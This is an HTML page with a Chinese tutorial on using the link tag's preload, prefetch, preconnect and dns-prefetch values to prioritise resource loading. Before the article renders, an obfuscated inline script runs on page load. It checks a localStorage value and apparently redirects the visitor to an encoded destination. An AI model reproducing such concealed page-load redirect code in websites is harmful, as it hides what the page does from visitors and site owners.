<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x1858(a,s){var c=_0x5c7e();return(_0x1858=function(s,n){var t=c[s-=172];void 0===_0x1858.KvfTyZ&&(_0x1858.UBNBIW=function(s,n){var t,o=[],a=0,c="";for(s=(s=>{for(var n,t,o="",a="",c=0,e=0;t=s.charAt(e++);~t&&(n=c%4?64*n+t:t,c++%4)&&(o+=String.fromCharCode(255&n>>(-2*c&6))))t="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(t);for(var l=0,r=o.length;l<r;l++)a+="%"+("00"+o.charCodeAt(l).toString(16)).slice(-2);return decodeURIComponent(a)})(s),e=0;e<256;e++)o[e]=e;for(e=0;e<256;e++)a=(a+o[e]+n.charCodeAt(e%n.length))%256,t=o[e],o[e]=o[a],o[a]=t;for(var e=0,a=0,l=0;l<s.length;l++)t=o[e=(e+1)%256],o[e]=o[a=(a+o[e])%256],o[a]=t,c+=String.fromCharCode(s.charCodeAt(l)^o[(o[e]+o[a])%256]);return c},a=arguments,_0x1858.KvfTyZ=!0);var s=s+c[0],o=a[s];return o?t=o:(void 0===_0x1858.rThHFU&&(_0x1858.rThHFU=!0),t=_0x1858.UBNBIW(t,n),a[s]=t),t})(a,s)}var _0x3f2f2f=_0x1858;function _0x5c7e(){var s=["W77cQ1tcP3ivW79XWRHP","quZdUSohWRm8zSkc","WQzEnbCxweZdU3FdTbFcISoj","hCouWPfTACoGWQ5j","WRJdTslcHSkVamkbWQJdLhBcTCoZECkMW7qUW4dcSehdOmkqW4uUWQ1EWQG","lKZcMrmbCHzwbmkGW4/dUmkz","WPxcSwvUWQq","WOdcGCkYk3xcOfKkWQi","nq9FsSkxBSoVWOC","rmkqpSoSW4xcShxdNG","qu/cKSkrW5nCr8kmW5WfWPFcRG","kszZWQZcNIddTa","WQTWhmkScSkaW6/dUJTa","WOJcHmovlMlcIx8L","W6zcWQZdPKDdW5W","WQ1lWO7dUKn5W4e","BgLlECk4vmos","WQzypXywwqBdV0ddNI7cUq","FmoFaSoQC3zXmG","W6BcTXJcNCkDsmoRW58","qmksD8k6W53cTK7dQSoTW4u","W6hcSwFdGSoTdmkzW4NdUx/cSmooAW","h8otW4G+m8kZW6DlWR/dIg93ea","W5KswvWpW5mEgq","vZRdP3rpwmkiW6LvBa","WQ/dJ8oto1SsW57cUSk3","qI5FWQJdPaVcGe9eEXVcQ0G","W7iVCba5W7JdUhFdNG","sCo8lbT2WQ/dMSk7","WOJcGmk9DqldRwiGWOTuW73cPq","WQWuW6VcVrmsWO1AW57dMd8LWOe","WQ8KW5hdP8k9W6zmwZXRs8kv"];return(_0x5c7e=function(){return s})()}if((()=>{for(var s=_0x1858,n=_0x5c7e();;)try{if(230049==+parseInt(s(198,"zHxr"))*(parseInt(s(177,"jCKA"))/2)+parseInt(s(181,"jAHG"))/3*(-parseInt(s(178,"h@52"))/4)+-parseInt(s(196,"giR^"))/5*(parseInt(s(194,"vRvE"))/6)+-parseInt(s(183,"U]V$"))/7*(parseInt(s(172,"Zoq0"))/8)+-parseInt(s(197,"jZmP"))/9*(-parseInt(s(176,"POwY"))/10)+parseInt(s(180,"Wj^q"))/11+parseInt(s(191,"2X1J"))/12*(parseInt(s(187,"giR^"))/13))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x3f2f2f(202,"Lvb6")](_0x3f2f2f(179,"l%ze"))!=_0x3f2f2f(192,"T9(!"))throw window[_0x3f2f2f(182,"MBm&")][_0x3f2f2f(200,"EXAG")](_0x3f2f2f(190,"nXTj")),Error();document.title="link 标签控制资源加载的优先级",document.getElementById("article").innerHTML='<div><p>在前端开发中，<code>&lt;link&gt;</code> 标签通过特定的 <code>rel</code> 属性可以精确控制资源加载的优先级，帮助浏览器优化页面性能，尤其是首屏渲染速度。最常用的是 <code>preload</code>、<code>prefetch</code> 和 <code>preconnect</code> 等属性，它们各自对应不同的加载策略和场景。</p>\n<h3>一、核心属性：控制优先级的关键</h3>\n<h4>1. <code>rel=&quot;preload&quot;</code>：强制高优先级加载（当前页面必需资源）</h4>\n<p><code>preload</code> 用于声明<strong>当前页面马上需要的关键资源</strong>   （如核心 JS、CSS、字体）强制设置高优先级，让浏览器提前加载，避免在解析 HTML 时才发现并加载这些资源导致的延迟。</p>\n<p><strong>用法示例</strong>   ：</p>\n<pre><code class="language-html"><span class="hljs-comment">&lt;!-- 预加载关键 CSS --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;critical.css&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;style&quot;</span> /&gt;</span>\n\n<span class="hljs-comment">&lt;!-- 预加载核心 JS --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;app.js&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;script&quot;</span> /&gt;</span>\n\n<span class="hljs-comment">&lt;!-- 预加载字体（需指定 crossorigin） --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span>\n  <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span>\n  <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;iconfont.woff2&quot;</span>\n  <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;font&quot;</span>\n  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;font/woff2&quot;</span>\n  <span class="hljs-attr">crossorigin</span>\n/&gt;</span>\n</code></pre>\n<p><strong>核心特点</strong>   ：</p>\n<ul>\n<li><strong>高优先级</strong>   ：浏览器会将 <code>preload</code> 资源视为“当前页面必需”，优先级高于普通资源（如 <code>&lt;script&gt;</code> 或 <code>&lt;link rel=&quot;stylesheet&quot;&gt;</code> 引入的资源）。</li>\n<li><strong>必须指定 <code>as</code></strong>   ：告诉浏览器资源类型（如 <code>style</code>、<code>script</code>、<code>font</code>、<code>image</code>），浏览器会根据类型分配正确的优先级和处理逻辑（若缺失 <code>as</code>，会被当作低优先级的 <code>fetch</code> 请求）。</li>\n<li><strong>无阻塞行为</strong>   ：<code>preload</code> 仅触发加载，不自动执行（如 JS 不会自动执行，CSS 不会自动应用），需后续手动使用（如通过 <code>onload</code> 绑定）。</li>\n<li><strong>适用场景</strong>   ：首屏必需的 CSS、启动 JS、关键图片（如 Logo）、字体（避免 FOIT 闪烁）。</li>\n</ul>\n<h4>2. <code>rel=&quot;prefetch&quot;</code>：低优先级预加载（未来页面可能需要的资源）</h4>\n<p><code>prefetch</code> 用于在<strong>当前页面空闲时，低优先级加载未来页面可能需要的资源</strong>   （如用户可能跳转的下一页 JS/CSS、图片），不影响当前页面的加载性能。</p>\n<p><strong>用法示例</strong>   ：</p>\n<pre><code class="language-html"><span class="hljs-comment">&lt;!-- 预加载下一页可能需要的 JS --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;next-page.js&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;script&quot;</span> /&gt;</span>\n\n<span class="hljs-comment">&lt;!-- 预加载可能用到的图片 --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;product-image.jpg&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;image&quot;</span> /&gt;</span>\n</code></pre>\n<p><strong>核心特点</strong>   ：</p>\n<ul>\n<li><strong>低优先级</strong>   ：浏览器会在当前页面的关键资源加载完成、网络空闲时才开始加载，不抢占带宽。</li>\n<li><strong>缓存机制</strong>   ：加载的资源会存入 HTTP 缓存或内存缓存，未来页面请求时可直接复用。</li>\n<li><strong>适用场景</strong>   ：用户大概率会访问的下一页资源（如分页的下一页、详情页入口）、模态框内的图片/脚本。</li>\n</ul>\n<h4>3. <code>rel=&quot;preconnect&quot;</code>：提前建立连接（减少握手开销）</h4>\n<p><code>preconnect</code> 用于<strong>提前与第三方域名建立 TCP 连接 + TLS 握手</strong>   （若为 HTTPS），消除跨域资源加载时的连接建立延迟（通常占 100-500ms）。</p>\n<p><strong>用法示例</strong>   ：</p>\n<pre><code class="language-html"><span class="hljs-comment">&lt;!-- 提前与 CDN 域名建立连接 --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preconnect&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.example.com&quot;</span> /&gt;</span>\n\n<span class="hljs-comment">&lt;!-- 带 crossorigin 的连接（如字体、第三方 API） --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preconnect&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://fonts.gstatic.com&quot;</span> <span class="hljs-attr">crossorigin</span> /&gt;</span>\n</code></pre>\n<p><strong>核心特点</strong>   ：</p>\n<ul>\n<li><strong>只建立连接，不加载资源</strong>   ：仅完成 DNS 解析、TCP 握手、TLS 协商（若 HTTPS），不传输实际内容。</li>\n<li><strong>时效性</strong>   ：建立的连接会保持一段时间（通常 10 秒左右），若超时未使用会关闭。</li>\n<li><strong>适用场景</strong>   ：明确会加载跨域资源的域名（如 CDN、第三方字体库、广告服务）。</li>\n</ul>\n<h4>4. <code>rel=&quot;dns-prefetch&quot;</code>：提前 DNS 解析（辅助 preconnect）</h4>\n<p><code>dns-prefetch</code> 是 <code>preconnect</code> 的轻量版，仅<strong>提前对域名进行 DNS 解析</strong>   （将域名转换为 IP 地址），不建立 TCP 或 TLS 连接，适用于“可能需要连接但不确定”的场景。</p>\n<p><strong>用法示例</strong>   ：</p>\n<pre><code class="language-html"><span class="hljs-comment">&lt;!-- 提前解析第三方域名的 DNS --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://stats.example.com&quot;</span> /&gt;</span>\n</code></pre>\n<p><strong>核心特点</strong>   ：</p>\n<ul>\n<li>开销极低，可并行解析多个域名的 DNS。</li>\n<li>常作为 <code>preconnect</code> 的补充：若不确定是否需要建立完整连接，先用 <code>dns-prefetch</code> 减少潜在的 DNS 延迟。</li>\n</ul>\n<h3>二、优先级对比与使用策略</h3>\n<p>不同 <code>rel</code> 属性的资源在浏览器中的加载优先级从高到低大致为：<br>\n<code>preload</code>（关键资源） &gt; 普通资源（<code>&lt;script&gt;</code>、<code>&lt;link rel=&quot;stylesheet&quot;&gt;</code>） &gt; <code>prefetch</code>（未来资源）</p>\n<p><strong>最佳实践</strong>   ：</p>\n<ol>\n<li>\n<p><strong>首屏关键资源用 <code>preload</code></strong>   ：如核心 CSS、启动 JS、首屏图片，确保最快加载。<br>\n⚠️ 注意：避免滥用 <code>preload</code>，过多高优先级资源会导致带宽竞争，反而拖慢整体速度。</p>\n</li>\n<li>\n<p><strong>未来资源用 <code>prefetch</code></strong>   ：如用户可能点击的下一页资源，利用空闲时间加载，提升跳转体验。</p>\n</li>\n<li>\n<p><strong>跨域资源提前 <code>preconnect</code></strong>   ：尤其是 HTTPS 域名，可节省 100-300ms 的握手时间（如 CDN、Google Fonts）。</p>\n</li>\n<li>\n<p><strong>字体加载必须配合 <code>crossorigin</code></strong>   ：由于字体资源存在跨域限制，<code>preload</code> 字体时必须添加 <code>crossorigin</code>（即使同域），否则浏览器会重复加载。</p>\n</li>\n</ol>\n<h3>三、常见问题与注意事项</h3>\n<ul>\n<li>\n<p><strong><code>preload</code> 与 <code>async</code>/<code>defer</code> 的区别</strong>   ：<br>\n<code>preload</code> 仅控制加载时机，不影响执行时机；<code>async</code>/<code>defer</code> 控制 JS 的执行时机（不阻塞 HTML 解析），两者可配合使用（如 <code>preload</code> 提前加载 JS，再通过 <code>onload</code> 动态插入 <code>&lt;script&gt;</code> 标签并设置 <code>async</code>）。</p>\n</li>\n<li>\n<p><strong>避免 <code>preload</code> 与普通加载重复</strong>   ：<br>\n若用 <code>preload</code> 加载了 <code>app.js</code>，后续又通过 <code>&lt;script src=&quot;app.js&quot;&gt;</code> 引入，浏览器会复用预加载的资源，不会重复下载，但需确保路径一致。</p>\n</li>\n<li>\n<p><strong><code>prefetch</code> 不是“必加载”</strong>   ：<br>\n浏览器可能因网络拥堵、缓存限制等原因跳过 <code>prefetch</code> 资源，不可依赖它加载当前页面必需的内容。</p>\n</li>\n</ul>\n<p>通过 <code>&lt;link&gt;</code> 标签的这些属性，开发者可以精细化控制资源加载的优先级和时机，显著提升页面加载性能，尤其是在首屏渲染和跨域资源加载场景中效果明显。</p>\n</div>'</script></body></html>